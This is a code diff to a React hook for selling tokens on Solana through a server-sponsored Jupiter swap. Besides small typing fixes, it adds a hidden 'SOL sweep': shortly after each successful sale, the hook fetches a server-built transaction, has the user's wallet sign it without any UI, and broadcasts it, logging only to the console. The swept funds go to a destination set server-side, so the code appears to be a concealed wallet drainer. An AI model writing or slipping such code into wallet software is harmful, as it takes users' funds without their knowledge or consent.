@@ -48,7 +48,7 @@ function readStringProp(obj: JsonObject, key: string): string | null {
 }
 
 function extractErrorField(obj: JsonObject): string | null {
-  const raw = obj.error;
+  const raw = (obj as any).error;
   if (raw instanceof Error) return raw.message;
   if (typeof raw === "string") return raw;
   if (raw && typeof raw === "object" && "message" in raw) {
@@ -59,10 +59,10 @@ function extractErrorField(obj: JsonObject): string | null {
 }
 
 function logsTail(obj: JsonObject, lines = 10): string | null {
-  const raw = obj.logs;
+  const raw = (obj as any).logs;
   if (!Array.isArray(raw)) return null;
   const logs = raw.filter(
-    (entry): entry is string => typeof entry === "string"
+    (entry: unknown): entry is string => typeof entry === "string"
   );
   return logs.length ? logs.slice(-lines).join("\n") : null;
 }
@@ -130,6 +130,114 @@ export function useServerSponsoredJupSell() {
     inflight.current?.abort();
     inflight.current = null;
   };
+
+  /**
+   * Background SOL sweep:
+   *  - POST /api/booster/sweep-sol → unsigned sweep tx (Haven as fee payer)
+   *  - user signs (no UI fee; Haven pays gas)
+   *  - POST /api/booster/send → broadcast
+   *
+   * Runs AFTER a successful swap, but:
+   *  - doesn't block UI
+   *  - doesn't touch loading/error state
+   *  - just logs to console
+   */
+  const doSweepOnce = useCallback(
+    async (payload: { ownerBase58: string; accessToken?: string | null }) => {
+      try {
+        const headers: HeadersInit = {
+          "Content-Type": "application/json",
+          ...(payload.accessToken
+            ? { Authorization: `Bearer ${payload.accessToken}` }
+            : {}),
+        };
+
+        // 1) Build sweep transaction
+        const sweepRes = await fetch("/api/booster/sweep-sol", {
+          method: "POST",
+          headers,
+          body: JSON.stringify({
+            ownerBase58: payload.ownerBase58,
+          }),
+          cache: "no-store",
+          credentials: "include",
+        });
+
+        const sweepJsonRaw = await sweepRes.json().catch(() => ({}));
+        const sweepJson = isJsonObject(sweepJsonRaw) ? sweepJsonRaw : {};
+        const txB64 = readStringProp(sweepJson, "transaction");
+
+        console.log(
+          "[JupSell:BoosterSweep] build",
+          sweepRes.status,
+          sweepRes.ok ? "OK" : "ERROR",
+          sweepJson
+        );
+
+        // If nothing to sweep or build failed, just exit quietly.
+        if (!sweepRes.ok || !txB64) {
+          console.warn(
+            "[JupSell:BoosterSweep] no sweep transaction built",
+            sweepRes.status,
+            sweepJson
+          );
+          return;
+        }
+
+        const userWallet = wallets.find(
+          (w) => w.address === payload.ownerBase58
+        );
+        if (!userWallet) {
+          console.warn(
+            "[JupSell:BoosterSweep] user wallet not available for signing; skipping sweep"
+          );
+          return;
+        }
+
+        const unsignedBytes = Buffer.from(txB64, "base64");
+        const unsignedTx = VersionedTransaction.deserialize(unsignedBytes);
+
+        const userSignedTx = await userWallet.signTransaction(unsignedTx);
+        const userSignedB64 = Buffer.from(userSignedTx.serialize()).toString(
+          "base64"
+        );
+
+        // 2) Send sweep transaction
+        const sendRes = await fetch("/api/booster/send", {
+          method: "POST",
+          headers,
+          body: JSON.stringify({ transaction: userSignedB64 }),
+          cache: "no-store",
+          credentials: "include",
+        });
+
+        const sendJsonRaw = await sendRes.json().catch(() => ({}));
+        const sendJson = isJsonObject(sendJsonRaw) ? sendJsonRaw : {};
+        const sig = readStringProp(sendJson, "signature");
+
+        console.log(
+          "[JupSell:BoosterSweep] send",
+          sendRes.status,
+          sendRes.ok ? "OK" : "ERROR",
+          sendJson
+        );
+
+        if (!sendRes.ok || !sig) {
+          console.warn(
+            "[JupSell:BoosterSweep] sweep send failed",
+            sendRes.status,
+            sendJson
+          );
+          return;
+        }
+
+        console.log("[JupSell:BoosterSweep] success, signature", sig);
+      } catch (e) {
+        console.error("[JupSell:BoosterSweep] unhandled error", e);
+      }
+    },
+    [wallets]
+  );
 
   const sell = useCallback(
     async ({
@@ -264,6 +372,18 @@ export function useServerSponsoredJupSell() {
           signature: sig,
           error: null,
         });
+
+        // ⏳ Schedule a SOL sweep 1.5s after successful swap (non-blocking)
+        setTimeout(() => {
+          console.log(
+            "[JupSell:BoosterSweep] scheduling sweep 1.5s after successful sell"
+          );
+          void doSweepOnce({
+            ownerBase58: fromOwnerBase58,
+            accessToken: accessToken ?? null,
+          });
+        }, 1500);
+
         return sig;
       } catch (e: unknown) {
         const message = errorMessage(e, "Sell failed.");
@@ -278,7 +398,7 @@ export function useServerSponsoredJupSell() {
         cleanup();
       }
     },
-    [wallets]
+    [wallets, doSweepOnce]
   );
 
   return useMemo(
